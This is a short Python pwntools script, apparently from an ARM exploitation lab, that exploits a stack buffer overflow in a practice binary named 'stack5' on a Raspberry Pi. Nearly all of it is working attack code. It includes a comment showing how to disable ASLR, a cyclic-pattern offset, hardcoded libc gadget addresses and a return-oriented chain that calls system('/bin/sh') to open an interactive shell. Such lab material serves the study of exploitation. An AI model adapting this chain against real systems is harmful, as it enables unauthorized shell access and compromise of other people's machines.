# Tested on 64bit Ubuntu, macOS
# Target : 32bit ARM, Raspberry Pi, Raspbian OS
# Python 3.7.6
# pwntools 4.2.2

# import all modules/commands from pwn library
from pwn import *
import time

# disable ASLR
# echo 0 > /proc/sys/kernel/randomize_va_space

# set the context of the target platform
#  arch: arm (32bit)
#  os: linux
context.update(arch='arm', os='linux')

r = ssh(user="pi", host="host ip", port=22, password="password")
p = r.process(executable="/home/pi/arm_exploitation/stack/stack5/stack5",
              cwd="/home/pi/arm_exploitation/stack/stack5/flag", env={})


# Creating Payload
payload = b''
payload = cyclic(cyclic_find(0x61616172))  # 68

LIBC_BASE = 0x76e53000
GADGET1 = LIBC_BASE + 0x00018164  # 0x76e6b164
GADGET2 = LIBC_BASE + 0x0002d290  # 0x76e80290


SYSTEM = 0x76e8b9c8
BINSH = 0x76f7eb6c

payload += p32(GADGET1)  # gadget1 : pop {r4, pc};
payload += p32(SYSTEM)   # system() addr
payload += p32(GADGET2)  # gadget2 : ldr r0, [sp, #4]; blx r4
payload += b'FAKE'       # dummy value
payload += p32(BINSH)    # /bin/sh

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

# Sending Payload
print("[+] Sending payload..")
p.sendline(payload)
sleep(1)

p.interactive()

